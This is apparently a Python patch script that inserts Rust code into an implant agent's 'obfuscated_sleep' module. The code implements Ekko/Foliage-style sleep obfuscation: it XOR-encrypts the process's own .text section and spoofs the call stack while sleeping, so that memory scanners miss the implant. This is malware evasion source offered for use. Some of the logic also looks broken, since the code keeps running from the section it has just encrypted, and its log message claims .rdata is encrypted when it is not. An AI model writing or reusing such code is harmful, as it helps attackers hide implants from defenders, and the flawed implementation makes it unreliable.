import re

with open("agent/src/obfuscated_sleep.rs", "r") as f:
    c = f.read()

sleep_logic = """
#[cfg(windows)]
pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Result<()> {
    match method {
        SleepMethod::Ekko | SleepMethod::Foliage => {
            info!("Initiating Ekko/Foliage-style sleep for {:?}", duration);
            
            #[cfg(target_arch = "x86_64")]
            unsafe {
                use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue};
                use winapi::um::synchapi::{CreateEventW, SetEvent, WaitForSingleObject};
                use winapi::um::winbase::INFINITE;
                use winapi::um::winnt::{WT_EXECUTEINTIMERTHREAD};
                use winapi::um::handleapi::CloseHandle;
                use winapi::shared::ntdef::BOOLEAN;
                use winapi::shared::minwindef::PVOID;

                let h_event = CreateEventW(std::ptr::null_mut(), 0, 0, std::ptr::null_mut());
                let h_timer_queue = CreateTimerQueue();
                let mut h_new_timer = std::ptr::null_mut();

                crypto::encrypt_sections();
                spoof::spoof_stack();
                
                let duration_ms = duration.as_millis() as u32;
                
                extern "system" fn timer_callback(lp_param: PVOID, _timer_or_wait_fired: BOOLEAN) {
                    unsafe {
                        SetEvent(lp_param as _);
                    }
                }

                CreateTimerQueueTimer(
                    &mut h_new_timer,
                    h_timer_queue,
                    Some(timer_callback),
                    h_event as _,
                    duration_ms,
                    0,
                    WT_EXECUTEINTIMERTHREAD,
                );

                WaitForSingleObject(h_event, INFINITE);

                spoof::restore_stack();
                crypto::decrypt_sections();

                DeleteTimerQueue(h_timer_queue);
                CloseHandle(h_event);
            }
            #[cfg(not(target_arch = "x86_64"))]
            {
                std::thread::sleep(duration);
            }
            Ok(())
        }
        SleepMethod::Standard => {
            info!("Standard sleep for {:?}", duration);
            std::thread::sleep(duration);
            Ok(())
        }
        _ => {
            info!("Standard sleep for {:?}", duration);
            std::thread::sleep(duration);
            Ok(())
        }
    }
}

pub mod crypto {
    use winapi::um::memoryapi::VirtualProtect;
    use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
    use winapi::um::libloaderapi::GetModuleHandleA;
    use std::sync::atomic::{AtomicU8, Ordering};

    static XOR_KEY: AtomicU8 = AtomicU8::new(0x42);

    unsafe fn get_text_section() -> Option<(*mut u8, usize)> {
        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
        let base = GetModuleHandleA(std::ptr::null_mut());
        if base.is_null() { return None; }
        
        let dos = base as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE { return None; }
        
        let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt).Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE { return None; }
        
        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        
        for _ in 0..(*nt).FileHeader.NumberOfSections {
            let name = String::from_utf8_lossy(&(*section).Name);
            if name.starts_with(".text") {
                let addr = (base as usize + (*section).VirtualAddress as usize) as *mut u8;
                let size = *(*section).Misc.VirtualSize() as usize;
                return Some((addr, size));
            }
            section = (section as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const _;
        }
        None
    }

    pub fn encrypt_sections() {
        log::debug!("Encrypting .text and .rdata using XOR");
        unsafe {
            if let Some((addr, size)) = get_text_section() {
                let mut old_protect = 0;
                VirtualProtect(addr as _, size, PAGE_READWRITE, &mut old_protect);
                let key = XOR_KEY.load(Ordering::SeqCst);
                for i in 0..size {
                    *addr.add(i) ^= key;
                }
                VirtualProtect(addr as _, size, old_protect, &mut old_protect);
            }
        }
    }
    
    pub fn decrypt_sections() {
        log::debug!("Decrypting sections");
        encrypt_sections();
    }
}
"""

c = re.sub(r'#\[cfg\(windows\)\].*?pub mod spoof \{', sleep_logic + '\npub mod spoof {', c, flags=re.DOTALL)

with open("agent/src/obfuscated_sleep.rs", "w") as f:
    f.write(c)

